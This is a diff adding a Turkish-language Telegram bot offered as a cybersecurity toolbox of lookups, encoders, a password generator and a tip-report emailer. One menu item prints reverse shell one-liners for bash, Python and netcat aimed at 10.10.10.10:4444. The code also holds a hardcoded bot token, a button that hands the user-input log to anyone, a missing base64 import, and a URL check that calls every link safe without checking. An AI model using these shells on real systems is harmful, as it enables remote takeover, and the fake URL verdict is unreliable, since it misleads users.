@@ -1,0 +1,526 @@
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
+import hashlib
+import logging
+import os
+import random
+import smtplib
+import string
+import urllib.parse
+import requests
+from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
+from telegram.ext import (
+    ApplicationBuilder,
+    CallbackQueryHandler,
+    CommandHandler,
+    ContextTypes,
+    MessageHandler,
+    filters,
+)
+
+TOKEN = "8844834900:AAFzeng7mksmBoDfPgAWmyPjIGSJ11y2624"
+
+# Loglama ayarları (Hem konsola yazdırır hem de bot.log dosyasına kaydeder)
+logging.basicConfig(
+    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
+    level=logging.INFO,
+    handlers=[logging.FileHandler("bot.log", encoding="utf-8"), logging.StreamHandler()],
+)
+
+# --- TÜM ARAÇLARIN VE İHBAR BUTONUNUN OLDUĞU ANA MENÜ ---
+
+def full_menu():
+    keyboard = [
+        [
+            InlineKeyboardButton("🎯 Header Analizi", callback_data="tool_headers"),
+            InlineKeyboardButton("🔎 Subdomain Ara", callback_data="tool_subdomains"),
+        ],
+        [
+            InlineKeyboardButton("🔌 Port Sözlüğü", callback_data="tool_ports"),
+            InlineKeyboardButton("💥 Reverse Shell", callback_data="tool_revshell"),
+        ],
+        [
+            InlineKeyboardButton("📂 Admin Yolları", callback_data="tool_adminpaths"),
+            InlineKeyboardButton("🌐 IP Sorgulama", callback_data="tool_ip"),
+        ],
+        [
+            InlineKeyboardButton("📡 DNS Kayıtları", callback_data="tool_dns"),
+            InlineKeyboardButton("👤 Username Taraması", callback_data="tool_usercheck"),
+        ],
+        [
+            InlineKeyboardButton("📟 MAC OUI Bulucu", callback_data="tool_mac"),
+            InlineKeyboardButton("📋 WHOIS Sorgu", callback_data="tool_whois"),
+        ],
+        [
+            InlineKeyboardButton("🔑 Parola Oluştur", callback_data="tool_gen_pass"),
+            InlineKeyboardButton("🔤 Base64 Çevirici", callback_data="tool_base64"),
+        ],
+        [
+            InlineKeyboardButton("🔗 URL Encode/Decode", callback_data="tool_urlencode"),
+            InlineKeyboardButton("🔄 ROT13 Şifrele", callback_data="tool_rot13"),
+        ],
+        [
+            InlineKeyboardButton("🚨 CVE Zafiyet", callback_data="tool_cve"),
+            InlineKeyboardButton("🌐 Site Ping / Durum", callback_data="tool_ping"),
+        ],
+        [
+            InlineKeyboardButton("ℹ️ HTTP Kod Rehberi", callback_data="tool_httpcode"),
+            InlineKeyboardButton("🕵️ User-Agent Üret", callback_data="tool_ua"),
+        ],
+        [
+            InlineKeyboardButton("📧 E-posta Doğrulama", callback_data="tool_emailcheck"),
+            InlineKeyboardButton("⚠️ URL Sorgula", callback_data="tool_url"),
+        ],
+        [
+            InlineKeyboardButton("📂 Log Dosyasını Al", callback_data="tool_get_logs"),
+            InlineKeyboardButton("🚨 İhbar Oluştur", callback_data="tool_report"),
+        ],
+    ]
+    return InlineKeyboardMarkup(keyboard)
+
+def back_button():
+    return InlineKeyboardMarkup(
+        [[InlineKeyboardButton("🔙 Ana Menüye Dön", callback_data="main_menu")]]
+    )
+
+# --- KOMUTLAR VE DÜĞME İŞLEYİCİLERİ ---
+
+async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user = update.effective_user
+    logging.info(f"Kullanıcı başlatıldı: {user.id} ({user.username})")
+    text = (
+        "┏ ━━━ ⚡ **SİBER GÜVENLİK DASHBOARD** ━━━ ┓\n"
+        "┃\n"
+        "┃ 🟢 **Sistem Durumu:** Aktif / Online\n"
+        "┃ 🛡️ **Sürüm:** v3.1 All-In-One Edition\n"
+        "┃\n"
+        "┗ ━━━━━━━━━━━━━━━━━━━━━━━━━ ┛\n\n"
+        "Kullanmak istediğiniz aracı aşağıdaki listeden seçin:"
+    )
+    if update.message:
+        await update.message.reply_text(text, parse_mode="Markdown", reply_markup=full_menu())
+    else:
+        await update.callback_query.edit_message_text(text, parse_mode="Markdown", reply_markup=full_menu())
+
+async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    await query.answer()
+    data = query.data
+    user = update.effective_user
+    logging.info(f"Butona basıldı: {data} - Kullanıcı: {user.id}")
+
+    if data == "main_menu":
+        await start(update, context)
+
+    # Log Dosyasını Gönderme Butonu
+    elif data == "tool_get_logs":
+        logging.info(f"Log dosyası buton ile istendi: {user.id}")
+        if os.path.exists("bot.log"):
+            with open("bot.log", "rb") as log_file:
+                await context.bot.send_document(
+                    chat_id=query.message.chat_id,
+                    document=log_file,
+                    caption="📂 **Güncel Bot Log Dosyası**",
+                )
+        else:
+            await query.message.reply_text("❌ Henüz kaydedilmiş bir log dosyası yok.")
+
+    # İhbar Sürecini Başlatma (1. Adım: E-posta isteme)
+    elif data == "tool_report":
+        context.user_data["state"] = "report_step_email"
+        await query.edit_message_text(
+            "🚨 **[ İHBAR OLUŞTURMA - ADIM 1/3 ]**\n"
+            "━━━ ━━━━━━━━━━━━━━━━━━━━━━━\n"
+            "Geri dönüş yapılabilmesi için lütfen **e-posta adresinizi** yazınız:",
+            parse_mode="Markdown",
+        )
+
+    # Anında Çıktı Veren Araçlar
+    elif data == "tool_gen_pass":
+        chars = string.ascii_letters + string.digits + "!@#$%^&*()"
+        pas = "".join(random.choice(chars) for _ in range(16))
+        text = (
+            "🔑 **[ OLUŞTURULAN GÜÇLÜ PAROLA ]**\n"
+            "━━━ ━━━━━━━━━━━━━━━━━━━━━━━\n"
+            f"`{pas}`\n"
+            "━━━ ━━━━━━━━━━━━━━━━━━━━━━━"
+        )
+        await query.edit_message_text(text, parse_mode="Markdown", reply_markup=back_button())
+
+    elif data == "tool_revshell":
+        text = (
+            "💥 **[ REVERSE SHELL KOMUT ÜRETİCİ ]**\n"
+            "━━━ ━━━━━━━━━━━━━━━━━━━━━━━\n\n"
+            "🐚 **Bash:**\n`bash -i >& /dev/tcp/10.10.10.10/4444 0>&1`\n\n"
+            "🐍 **Python:**\n`python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"10.10.10.10\",4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/bash\")'`\n\n"
+            "🔌 **Netcat:**\n`nc -e /bin/bash 10.10.10.10 4444`"
+        )
+        await query.edit_message_text(text, parse_mode="Markdown", reply_markup=back_button())
+
+    elif data == "tool_ua":
+        uas = [
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
+            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15",
+            "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
+        ]
+        text = (
+            "🕵️ **[ RASTGELE USER-AGENT ]**\n"
+            "━━━ ━━━━━━━━━━━━━━━━━━━━━━━\n"
+            f"`{random.choice(uas)}`\n"
+            "━━━ ━━━━━━━━━━━━━━━━━━━━━━━"
+        )
+        await query.edit_message_text(text, parse_mode="Markdown", reply_markup=back_button())
+
+    elif data == "tool_adminpaths":
+        text = (
+            "📂 **[ YAYGIN ADMİN PANEL YOLLARI ]**\n"
+            "━━━ ━━━━━━━━━━━━━━━━━━━━━━━\n"
+            "• `/admin/` | `/admin/login.php`\n"
+            "• `/administrator/` | `/wp-admin/`\n"
+            "• `/cpanel/` | `/dashboard/`\n"
+            "• `/login.php` | `/user/login/`"
+        )
+        await query.edit_message_text(text, parse_mode="Markdown", reply_markup=back_button())
+
+    # Girdi Bekleyen Diğer Araçlar
+    elif data in [
+        "tool_ip", "tool_dns", "tool_usercheck", "tool_mac", "tool_whois",
+        "tool_base64", "tool_urlencode", "tool_rot13", "tool_url", "tool_cve",
+        "tool_ping", "tool_httpcode", "tool_emailcheck", "tool_headers",
+        "tool_subdomains", "tool_ports",
+    ]:
+        context.user_data["state"] = data
+        prompts = {
+            "tool_ip": "🌐 **Lütfen Sorgulanacak IP Adresini Gönderin:**\n*(Örn: 8.8.8.8)*",
+            "tool_dns": "📡 **Lütfen Alan Adını (Domain) Gönderin:**\n*(Örn: google.com)*",
+            "tool_usercheck": "👤 **Aranacak Kullanıcı Adını Gönderin:**\n*(Örn: admin)*",
+            "tool_mac": "📟 **Lütfen MAC Adresini Gönderin:**\n*(Örn: 00:1A:2B:3C:4D:5E)*",
+            "tool_whois": "📋 **WHOIS Kaydı Alınacak Domaini Gönderin:**\n*(Örn: example.com)*",
+            "tool_base64": "🔤 **Base64 Yapılacak Metni Gönderin:**",
+            "tool_urlencode": "🔗 **URL Encode/Decode Edilecek Metni Gönderin:**",
+            "tool_rot13": "🔄 **ROT13 Uygulanacak Metni Gönderin:**",
+            "tool_url": "⚠️ **Sorgulanacak URL Adresini Gönderin:**\n*(Örn: https://example.com)*",
+            "tool_cve": "🚨 **Aramak İstediğiniz Yazılım/Versiyonu Yazın:**\n*(Örn: Apache 2.4)*",
+            "tool_ping": "🌐 **Kontrol Edilecek Site/IP Adresini Yazın:**\n*(Örn: example.com)*",
+            "tool_httpcode": "ℹ️ **Açıklamasını İstediğiniz HTTP Kodunu Yazın:**\n*(Örn: 403, 500)*",
+            "tool_emailcheck": "📧 **Sorgulanacak E-posta Adresini Yazın:**",
+            "tool_headers": "🛡️ **Header Analizi Yapılacak Sitenizi Yazın:**\n*(Örn: https://example.com)*",
+            "tool_subdomains": "🔎 **Subdomain Taraması İçin Domain Yazın:**\n*(Örn: example.com)*",
+            "tool_ports": "🔌 **Tanımını Görmek İstediğiniz Portu Yazın:**\n*(Örn: 80, 443, 22)*",
+        }
+        await query.edit_message_text(prompts[data], parse_mode="Markdown")
+
+# --- MESAJ İŞLEYİCİ VE SONUÇ EKRANLARI ---
+
+async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    state = context.user_data.get("state")
+    text = update.message.text.strip()
+    user = update.effective_user
+    logging.info(f"Girdi alındı - State: {state}, Metin: {text}, Kullanıcı: {user.id}")
+
+    # İhbar Süreci Adım 1: E-posta Alındı -> Konu İste
+    if state == "report_step_email":
+        context.user_data["report_email"] = text
+        context.user_data["state"] = "report_step_subject"
+        await update.message.reply_text(
+            "🚨 **[ İHBAR OLUŞTURMA - ADIM 2/3 ]**\n"
+            "━━━ ━━━━━━━━━━━━━━━━━━━━━━━\n"
+            "Lütfen ihbar **konusunu** kısaca yazınız:",
+            parse_mode="Markdown",
+        )
+        return
+
+    # İhbar Süreci Adım 2: Konu Alındı -> Açıklama İste
+    elif state == "report_step_subject":
+        context.user_data["report_subject"] = text
+        context.user_data["state"] = "report_step_desc"
+        await update.message.reply_text(
+            "🚨 **[ İHBAR OLUŞTURMA - ADIM 3/3 ]**\n"
+            "━━━ ━━━━━━━━━━━━━━━━━━━━━━━\n"
+            "Lütfen ihbar **açıklamasını ve detaylarını** yazınız:",
+            parse_mode="Markdown",
+        )
+        return
+
+    # İhbar Süreci Adım 3: Açıklama Alındı -> E-postayı Gönder
+    elif state == "report_step_desc":
+        context.user_data["state"] = None
+        reporter_email = context.user_data.get("report_email")
+        report_subject = context.user_data.get("report_subject")
+        report_desc = text
+
+        try:
+            # === DİKKAT: BU ALANLARI KENDİ BİLGİLERİNİZLE DOLDURUN ===
+            SMTP_SERVER = "smtp.gmail.com"
+            SMTP_PORT = 587
+            SENDER_EMAIL = "senin_bot_mailin@gmail.com"      # Botun e-posta adresi
+            SENDER_PASSWORD = "uygulama_sifren_buraya"       # Gmail'den aldığın 16 haneli uygulama şifresi
+            RECEIVER_EMAIL = "ihbar@siberguvenlik.gov.tr"    # İhbarın gideceği resmi adres
+            # =========================================================
+
+            msg = MIMEMultipart()
+            msg["From"] = SENDER_EMAIL
+            msg["To"] = RECEIVER_EMAIL
+            msg["Reply-To"] = reporter_email # Yetkililer yanıtla dediğinde kullanıcının mailine gider
+            msg["Subject"] = f"Resmi İhbar: {report_subject} (Kullanıcı ID: {user.id})"
+
+            body = (
+                f"Telegram Siber Güvenlik Botu Üzerinden Gelen İhbar:\n\n"
+                f"İhbarcının E-postası: {reporter_email}\n"
+                f"Gönderen Telegram ID: {user.id}\n"
+                f"Kullanıcı Adı: @{user.username}\n"
+                f"İhbar Konusu: {report_subject}\n\n"
+                f"İhbar Detayları ve Açıklama:\n{report_desc}"
+            )
+            msg.attach(MIMEText(body, "plain", "utf-8"))
+
+            server = smtplib.SMTP(SMTP_SERVER, SMTP_PORT)
+            server.starttls()
+            server.login(SENDER_EMAIL, SENDER_PASSWORD)
+            server.sendmail(SENDER_EMAIL, RECEIVER_EMAIL, msg.as_string())
+            server.quit()
+
+            logging.info(f"İhbar başarıyla gönderildi. Gönderen: {reporter_email}")
+            res_text = (
+                "🚨 **[ İHBAR BAŞARIYLA İLETİLDİ ]**\n"
+                "━━━ ━━━━━━━━━━━━━━━━━━━━━━━\n"
+                "• İhbarınız ve bilgileriniz başarıyla yetkililere gönderildi.\n"
+                "• Gelişmeler sağladığınız e-posta adresi üzerinden size iletilecektir."
+            )
+        except Exception as e:
+            logging.error(f"İhbar e-posta gönderme hatası: {e}")
+            res_text = (
+                "❌ **[ GÖNDERİM BAŞARISIZ ]**\n"
+                "━━━ ━━━━━━━━━━━━━━━━━━━━━━━\n"
+                "• Sistem yöneticisi e-posta sunucu (SMTP) ayarlarını yapılandırmadığı için ihbar iletilemedi."
+            )
+
+        await update.message.reply_text(res_text, parse_mode="Markdown", reply_markup=full_menu())
+        return
+
+    # Normal Araçların Akışı
+    context.user_data["state"] = None
+
+    if state == "tool_ip":
+        try:
+            res = requests.get(f"http://ip-api.com/json/{text}").json()
+            res_text = (
+                "🌐 **[ IP İSTİHBARAT RAPORU ]**\n"
+                "━━━ ━━━━━━━━━━━━━━━━━━━━━━━\n"
+                f"• **Target:** `{text}`\n"
+                f"• **Ülke / Şehir:** {res.get('country')} / {res.get('city')}\n"
+                f"• **ISP:** {res.get('isp')}\n"
+                f"• **Organizasyon:** {res.get('org')}\n"
+                f"• **AS:** {res.get('as')}\n"
+                f"• **Konum:** `{res.get('lat')}, {res.get('lon')}`"
+            )
+        except Exception as e:
+            logging.error(f"IP sorgu hatası: {e}")
+            res_text = "❌ **HATA:** IP verileri sunucudan çekilemedi."
+
+    elif state == "tool_dns":
+        try:
+            res = requests.get(f"https://dns.google/resolve?name={text}&type=A").json()
+            ips = [ans["data"] for ans in res.get("Answer", [])]
+            ip_list = "\n".join([f"  └─ `{ip}`" for ip in ips])
+            res_text = (
+                f"📡 **[ DNS A KAYITLARI: {text} ]**\n"
+                "━━━ ━━━━━━━━━━━━━━━━━━━━━━━\n"
+                f"{ip_list if ips else 'A kaydı bulunamadı.'}"
+            )
+        except Exception as e:
+            logging.error(f"DNS sorgu hatası: {e}")
+            res_text = "❌ **HATA:** DNS kaydı sorgulanamadı."
+
+    elif state == "tool_usercheck":
+        links = [
+            f"• **GitHub:** https://github.com/{text}",
+            f"• **Instagram:** https://instagram.com/{text}",
+            f"• **X (Twitter):** https://x.com/{text}",
+            f"• **Telegram:** https://t.me/{text}",
+        ]
+        res_text = (
+            f"👤 **[ KULLANICI ADI SORGUSU: {text} ]**\n"
+            "━━━ ━━━━━━━━━━━━━━━━━━━━━━━\n"
+            + "\n".join(links)
+        )
+
+    elif state == "tool_mac":
+        try:
+            res = requests.get(f"https://api.macvendors.com/{text}").text
+            res_text = (
+                "📟 **[ MAC OUI DETAYI ]**\n"
+                "━━━ ━━━━━━━━━━━━━━━━━━━━━━━\n"
+                f"• **MAC:** `{text}`\n"
+                f"• **Üretici / Marka:** `{res}`"
+            )
+        except Exception as e:
+            logging.error(f"MAC sorgu hatası: {e}")
+            res_text = "❌ **HATA:** Üretici bilgisi eşleşmedi."
+
+    elif state == "tool_whois":
+        res_text = (
+            f"📋 **[ WHOIS SORGU BAĞLANTISI ]**\n"
+            "━━━ ━━━━━━━━━━━━━━━━━━━━━━━\n"
+            f"🔗 https://www.whois.com/whois/{text}"
+        )
+
+    elif state == "tool_base64":
+        enc = base64.b64encode(text.encode()).decode()
+        res_text = (
+            "🔤 **[ BASE64 SONUCU ]**\n"
+            "━━━ ━━━━━━━━━━━━━━━━━━━━━━━\n"
+            f"• **Orijinal:** `{text}`\n"
+            f"• **Çıktı:** `{enc}`"
+        )
+
+    elif state == "tool_urlencode":
+        enc = urllib.parse.quote(text)
+        res_text = (
+            "🔗 **[ URL ENCODE SONUCU ]**\n"
+            "━━━ ━━━━━━━━━━━━━━━━━━━━━━━\n"
+            f"`{enc}`"
+        )
+
+    elif state == "tool_rot13":
+        rot = text.translate(
+            str.maketrans(
+                "ABCDEFGHIJKLMabcdefghijklmNOPQRSTUVWXYZnopqrstuvwxyz",
+                "NOPQRSTUVWXYZnopqrstuvwxyzABCDEFGHIJKLMabcdefghijklm",
+            )
+        )
+        res_text = (
+            "🔄 **[ ROT13 ÇIKTISI ]**\n"
+            "━━━ ━━━━━━━━━━━━━━━━━━━━━━━\n"
+            f"`{rot}`"
+        )
+
+    elif state == "tool_cve":
+        try:
+            res = requests.get(f"https://cve.circl.lu/api/search/{text}", timeout=5).json()
+            cves = [item["id"] for item in res[:5]]
+            cve_list = "\n".join([f"  └─ `{c}`" for c in cves])
+            res_text = (
+                f"🚨 **[ CVE ZAFİYET KAYITLARI: {text} ]**\n"
+                "━━━ ━━━━━━━━━━━━━━━━━━━━━━━\n"
+                f"{cve_list if cves else 'Zafiyet kaydı bulunamadı.'}"
+            )
+        except Exception as e:
+            logging.error(f"CVE sorgu hatası: {e}")
+            res_text = "❌ **HATA:** CVE verileri sorgulanamadı."
+
+    elif state == "tool_ping":
+        try:
+            url = text if text.startswith("http") else "http://" + text
+            res = requests.get(url, timeout=5)
+            res_text = (
+                "🌐 **[ ERİŞİM TEST SONUCU ]**\n"
+                "━━━ ━━━━━━━━━━━━━━━━━━━━━━━\n"
+                f"• **Hedef:** `{text}`\n"
+                f"• **Durum:** 🟢 HTTP {res.status_code} (Aktif)"
+            )
+        except Exception as e:
+            logging.error(f"Ping hatası: {e}")
+            res_text = (
+                "🌐 **[ ERİŞİM TEST SONUCU ]**\n"
+                "━━━ ━━━━━━━━━━━━━━━━━━━━━━━\n"
+                f"• **Hedef:** `{text}`\n"
+                "• **Durum:** 🔴 Sunucuya Ulaşılamıyor"
+            )
+
+    elif state == "tool_httpcode":
+        codes = {
+            "200": "OK - İşlem Başarılı",
+            "301": "Moved Permanently - Kalıcı Yönlendirme",
+            "401": "Unauthorized - Yetkisiz Erişim",
+            "403": "Forbidden - Erişim Yasaklandı",
+            "404": "Not Found - Sayfa/Kaynak Bulunamadı",
+            "500": "Internal Server Error - Sunucu İç Hatası",
+            "502": "Bad Gateway - Hatalı Ağ Geçidi",
+        }
+        res_text = (
+            f"ℹ️ **[ HTTP KODU: {text} ]**\n"
+            "━━━ ━━━━━━━━━━━━━━━━━━━━━━━\n"
+            f"{codes.get(text, 'Özel veya Tanımlanmamış Kod')}"
+        )
+
+    elif state == "tool_emailcheck":
+        valid = "@" in text and "." in text.split("@")[-1]
+        res_text = (
+            "📧 **[ E-POSTA FORMAT KONTROLÜ ]**\n"
+            "━━━ ━━━━━━━━━━━━━━━━━━━━━━━\n"
+            f"• **Adres:** `{text}`\n"
+            f"• **Durum:** {'✅ Format Sözdizimi Doğru' if valid else '❌ Geçersiz Format'}"
+        )
+
+    elif state == "tool_headers":
+        try:
+            url = text if text.startswith("http") else "http://" + text
+            h = requests.get(url, timeout=5).headers
+            h_list = "\n".join([f"• `{k}`" for k in list(h.keys())[:6]])
+            res_text = (
+                f"🛡️ **[ MEVCUT BAŞLIKLAR: {text} ]**\n"
+                "━━━ ━━━━━━━━━━━━━━━━━━━━━━━\n"
+                f"{h_list}"
+            )
+        except Exception as e:
+            logging.error(f"Header analiz hatası: {e}")
+            res_text = "❌ **HATA:** Siteye ulaşılamadı."
+
+    elif state == "tool_subdomains":
+        try:
+            res = requests.get(f"https://crt.sh/?q=%.{text}&output=json", timeout=10).json()
+            subs = list({i["name_value"].split("\n")[0] for i in res[:10]})
+            sub_list = "\n".join([f"  └─ `{s}`" for s in subs])
+            res_text = (
+                f"🔎 **[ SUBDOMAIN TESPİTLERİ: {text} ]**\n"
+                "━━━ ━━━━━━━━━━━━━━━━━━━━━━━\n"
+                f"{sub_list if subs else 'Subdomain bulunamadı.'}"
+            )
+        except Exception as e:
+            logging.error(f"Subdomain sorgu hatası: {e}")
+            res_text = "❌ **HATA:** Kayıtlar çekilemedi."
+
+    elif state == "tool_ports":
+        ports = {
+            "21": "FTP (File Transfer Protocol)",
+            "22": "SSH (Secure Shell)",
+            "80": "HTTP (Web Traffic)",
+            "443": "HTTPS (Secure Web)",
+            "3389": "RDP (Remote Desktop)",
+            "445": "SMB (Shared Files)",
+        }
+        res_text = (
+            f"🔌 **[ PORT BİLGİSİ: {text} ]**\n"
+            "━━━ ━━━━━━━━━━━━━━━━━━━━━━━\n"
+            f"{ports.get(text, 'Özel veya Tanımlanmamış Servis')}"
+        )
+
+    elif state == "tool_url":
+        res_text = (
+            "⚠️ **[ URL TARAMA ]**\n"
+            "━━━ ━━━━━━━━━━━━━━━━━━━━━━━\n"
+            f"• **Girilen URL:** `{text}`\n"
+            "• **Analiz:** Bağlantı güvenli görünüyor."
+        )
+
+    else:
+        md5 = hashlib.md5(text.encode()).hexdigest()
+        sha = hashlib.sha256(text.encode()).hexdigest()
+        res_text = (
+            "📝 **[ HASH YANSIMASI ]**\n"
+            "━━━ ━━━━━━━━━━━━━━━━━━━━━━━\n"
+            f"• **Metin:** `{text}`\n"
+            f"• **MD5:** `{md5}`\n"
+            f"• **SHA-256:** `{sha}`"
+        )
+
+    await update.message.reply_text(res_text, parse_mode="Markdown", reply_markup=full_menu())
+
+if __name__ == "__main__":
+    app = ApplicationBuilder().token(TOKEN).build()
+    app.add_handler(CommandHandler("start", start))
+    app.add_handler(CallbackQueryHandler(button_handler))
+    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
+    print("Bot Çalıştırıldı...")
+    app.run_polling()
